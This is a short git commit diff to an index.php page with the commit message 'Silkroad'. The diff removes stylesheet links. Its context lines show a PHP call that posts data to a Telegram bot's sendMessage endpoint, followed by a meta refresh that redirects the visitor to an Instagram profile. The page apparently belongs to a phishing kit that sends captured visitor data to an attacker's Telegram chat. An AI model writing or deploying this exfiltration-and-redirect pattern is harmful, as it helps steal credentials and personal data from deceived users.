dce472dc22123b8b79de9d8f354ffb67e38e6d4c
Xavier Orejarena <xavierorejarena@Xavier-MacBook-Pro.local>
2021-09-09 15:05:55 -0400

    Silkroad

--- index.php
+++ index.php
@@ -6,11 +6,4 @@ file_get_contents("https://api.telegram.org/bot7$token/sendMessage?chat_id=14927
 
 <head>
     <meta http-equiv="refresh" content="3;url=https://www.instagram.com/angelinarequesensestafadora/" />
-    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Material+Icons">
-    <link rel="stylesheet" href="https://unpkg.com/bootstrap-material-design@4.1.1/dist/css/bootstrap-material-design.min.css" integrity="sha384-wXznGJNEXNG1NFsbm0ugrLFMQPWswR3lds2VeinahP8N0zJw9VWSopbjv2x7WCvX" crossorigin="anonymous">
-    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
-    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:400,700|Material+Icons">
-    <link rel="stylesgeet" href="https://rawgit.com/creativetimofficial/material-kit/master/assets/css/material-kit.css">
-    <link rel="stylesheet" href="css.css">
 </head>
